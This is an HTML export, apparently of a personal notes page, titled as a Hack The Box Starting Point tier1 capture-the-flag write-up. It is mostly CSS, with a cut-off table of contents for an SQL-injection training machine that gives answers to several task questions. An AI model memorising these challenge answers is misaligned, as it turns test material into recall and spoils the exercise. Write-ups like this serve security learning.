@@ -1,0 +1,1186 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HTB writeup - Starting Point tier1</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+}
+
+.simple-table-header {
+	background: rgb(247, 246, 243);
+	color: black;
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="b274d482-1359-4f68-bc68-caaf4322727d" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">1️⃣</span></div><h1 class="page-title">HTB writeup - Starting Point tier1</h1><table class="properties"><tbody><tr class="property-row property-row-created_by"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedBy"><path d="M13.125,10.0354 C12.5536,9.48588 10.801,8.53125 9.625,7.875 L9.625,7.04112 C9.849,6.71912 10.045,6.37 10.1911,5.98588 C10.5849,5.7435 10.9375,5.28412 10.9375,4.8125 C10.9375,4.35488 10.9323,3.94275 10.4668,3.605 C10.3049,1.5575 9.436,0 7,0 C4.564,0 3.69513,1.5575 3.53325,3.605 C3.06775,3.94275 3.0625,4.35488 3.0625,4.8125 C3.0625,5.28412 3.41513,5.7435 3.80888,5.98588 C3.955,6.37 4.151,6.71912 4.375,7.04112 L4.375,7.875 C3.199,8.53125 1.44638,9.48588 0.875,10.0354 C0.1645,10.7188 0,11.8125 0,14 L14,14 C14,11.8125 13.8364,10.7188 13.125,10.0354 Z"></path></svg></span>Created By</th><td></td></tr><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M7.01356 14.0001C8.8042 14.0001 10.5958 13.3107 11.9575 11.9324C14.681 9.21201 14.6808 4.7603 11.9571 2.04013C9.23336 -0.680043 4.77573 -0.680043 2.05199 2.04013C0.727519 3.36277 0 5.13301 0 6.99553C0 8.8764 0.727811 10.6285 2.05199 11.9509C3.43207 13.3106 5.22243 14.0001 7.01356 14.0001ZM3.72947 7.00914V8.461V8.65543H3.92382H5.34563H8.2794H8.4738V8.461V5.52541V3.37947V3.18502H8.2794H6.82747H6.63307V3.37947V6.81467H3.92382H3.72947V7.00914ZM1.83985 6.99553C1.83985 5.61698 2.38099 4.32597 3.36061 3.3477C5.36746 1.34337 8.64803 1.34062 10.6585 3.33944C10.6613 3.34219 10.6639 3.34494 10.6668 3.3477C12.676 5.3546 12.6763 8.63642 10.6668 10.6434C8.65705 12.6504 5.37031 12.6504 3.36061 10.6434C2.38099 9.66506 1.83985 8.37408 1.83985 6.99553Z"></path></svg></span>Created time</th><td><time>@February 13, 2022 1:49 PM</time></td></tr><tr class="property-row property-row-last_edited_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M7.01356 14.0001C8.8042 14.0001 10.5958 13.3107 11.9575 11.9324C14.681 9.21201 14.6808 4.7603 11.9571 2.04013C9.23336 -0.680043 4.77573 -0.680043 2.05199 2.04013C0.727519 3.36277 0 5.13301 0 6.99553C0 8.8764 0.727811 10.6285 2.05199 11.9509C3.43207 13.3106 5.22243 14.0001 7.01356 14.0001ZM3.72947 7.00914V8.461V8.65543H3.92382H5.34563H8.2794H8.4738V8.461V5.52541V3.37947V3.18502H8.2794H6.82747H6.63307V3.37947V6.81467H3.92382H3.72947V7.00914ZM1.83985 6.99553C1.83985 5.61698 2.38099 4.32597 3.36061 3.3477C5.36746 1.34337 8.64803 1.34062 10.6585 3.33944C10.6613 3.34219 10.6639 3.34494 10.6668 3.3477C12.676 5.3546 12.6763 8.63642 10.6668 10.6434C8.65705 12.6504 5.37031 12.6504 3.36061 10.6434C2.38099 9.66506 1.83985 8.37408 1.83985 6.99553Z"></path></svg></span>Last Edited</th><td><time>@March 5, 2022 6:43 PM</time></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-default">HTB</span><span class="selected-value select-value-color-pink">Sec</span><span class="selected-value select-value-color-blue">tier1</span><span class="selected-value select-value-color-blue">writeup</span></td></tr><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>Author</th><td></td></tr><tr class="property-row property-row-url"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesUrl"><path d="M3.73333,3.86667 L7.46667,3.86667 C8.49613,3.86667 9.33333,4.70387 9.33333,5.73333 C9.33333,6.7628 8.49613,7.6 7.46667,7.6 L6.53333,7.6 C6.01813,7.6 5.6,8.0186 5.6,8.53333 C5.6,9.04807 6.01813,9.46667 6.53333,9.46667 L7.46667,9.46667 C9.5284,9.46667 11.2,7.79507 11.2,5.73333 C11.2,3.6716 9.5284,2 7.46667,2 L3.73333,2 C1.6716,2 0,3.6716 0,5.73333 C0,7.124 0.762067,8.33453 1.88953,8.97713 C1.87553,8.83107 1.86667,8.6836 1.86667,8.53333 C1.86667,7.92013 1.98753,7.33447 2.2036,6.7978 C1.99267,6.4954 1.86667,6.12953 1.86667,5.73333 C1.86667,4.70387 2.70387,3.86667 3.73333,3.86667 Z M12.1095,5.28907 C12.1231,5.4356 12.1333,5.58307 12.1333,5.73333 C12.1333,6.34607 12.0101,6.9294 11.7931,7.46513 C12.0059,7.768 12.1333,8.13573 12.1333,8.53333 C12.1333,9.5628 11.2961,10.4 10.2667,10.4 L6.53333,10.4 C5.50387,10.4 4.66667,9.5628 4.66667,8.53333 C4.66667,7.50387 5.50387,6.66667 6.53333,6.66667 L7.46667,6.66667 C7.98187,6.66667 8.4,6.24807 8.4,5.73333 C8.4,5.2186 7.98187,4.8 7.46667,4.8 L6.53333,4.8 C4.4716,4.8 2.8,6.4716 2.8,8.53333 C2.8,10.59507 4.4716,12.2667 6.53333,12.2667 L10.2667,12.2667 C12.3284,12.2667 14,10.59507 14,8.53333 C14,7.14267 13.2375,5.93167 12.1095,5.28907 Z"></path></svg></span>URL</th><td><a href="https://app.hackthebox.com/starting-point" class="url-value">https://app.hackthebox.com/starting-point</a></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>Topic</th><td></td></tr><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M7.01356 14.0001C8.8042 14.0001 10.5958 13.3107 11.9575 11.9324C14.681 9.21201 14.6808 4.7603 11.9571 2.04013C9.23336 -0.680043 4.77573 -0.680043 2.05199 2.04013C0.727519 3.36277 0 5.13301 0 6.99553C0 8.8764 0.727811 10.6285 2.05199 11.9509C3.43207 13.3106 5.22243 14.0001 7.01356 14.0001ZM3.72947 7.00914V8.461V8.65543H3.92382H5.34563H8.2794H8.4738V8.461V5.52541V3.37947V3.18502H8.2794H6.82747H6.63307V3.37947V6.81467H3.92382H3.72947V7.00914ZM1.83985 6.99553C1.83985 5.61698 2.38099 4.32597 3.36061 3.3477C5.36746 1.34337 8.64803 1.34062 10.6585 3.33944C10.6613 3.34219 10.6639 3.34494 10.6668 3.3477C12.676 5.3546 12.6763 8.63642 10.6668 10.6434C8.65705 12.6504 5.37031 12.6504 3.36061 10.6434C2.38099 9.66506 1.83985 8.37408 1.83985 6.99553Z"></path></svg></span>Property</th><td><time>@February 13, 2022 1:49 PM</time></td></tr></tbody></table></header><div class="page-body"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="1636b6db-51dd-4da7-9a9f-bb0d7a7fb18b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"> Turn on dark 🌒  mode with cmd/ctrl + shift + L</div></figure><hr id="a4a57a0c-cdb0-4074-9be4-48ddb69223b6"/><nav id="e7618d63-2d55-4c6f-9691-8419f8c0f9f0" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#64b50cc3-a213-4696-ab1c-7f59c19cf554">🗓  Appointment (SQL Injection)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0db8d329-df49-46ae-8f6b-4f4574d141a2">Tasks</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cd8a5eb2-4d39-4ae5-8290-709e2def255c">What does PII stand for? → <code><em>Personally identifiable information</em></code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1f5bde1b-51e1-455d-a657-3129bb8f3ada">What does the OWASP Top 10 list name the classification for this vulnerability? → <code>A03:2021-Injection</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ab1cc0cf-b6e6-4ec8-8b07-d0189daca161">What service and version are running on port 80 of the target?</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#17b5ce5a-00d2-421c-976e-949db08dd976">What is one luck-based method of exploiting login pages? → brute-forcing</a></div><div 